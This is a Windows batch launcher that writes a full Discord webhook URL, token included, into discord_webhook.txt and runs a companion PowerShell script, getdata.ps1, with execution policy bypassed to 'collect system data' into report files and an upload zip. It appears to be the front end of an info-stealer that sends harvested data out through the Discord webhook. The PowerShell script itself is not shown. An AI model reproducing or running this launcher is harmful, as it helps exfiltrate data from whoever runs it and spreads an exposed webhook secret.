@echo off
setlocal enableextensions

set "ROOT=%~dp0"
set "PS1=%ROOT%getdata.ps1"
set "OUT=%ROOT%info.txt"
set "JSON=%ROOT%info.json"
set "ZIP=%ROOT%info_upload.zip"
set "DONE=%ROOT%done.txt"

if not exist "%PS1%" (
    echo Missing file: "%PS1%"
    echo Create getdata.ps1 first, then run this again.
    pause
    exit /b 1
)

if exist "%DONE%" del /f /q "%DONE%" >nul 2>nul

echo Collecting system data... this can take a minute.
echo https://discord.com/api/webhooks/1487128618189717606/Jh4fhNACI4jLruL64J8wIfIdC_78LbQ1AJIQSp5lCtysEpOX7fJe8_ak6tUxT5A9C6HZ>discord_webhook.txt
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%"
if errorlevel 1 (
    echo.
    echo Data collection returned an error.
    pause
    exit /b 1
)

if not exist "%OUT%" (
    echo.
    echo No report was created at "%OUT%".
    pause
    exit /b 1
)

if not exist "%JSON%" (
    echo.
    echo No JSON report was created at "%JSON%".
)
echo Finished.
pause
exit /b 0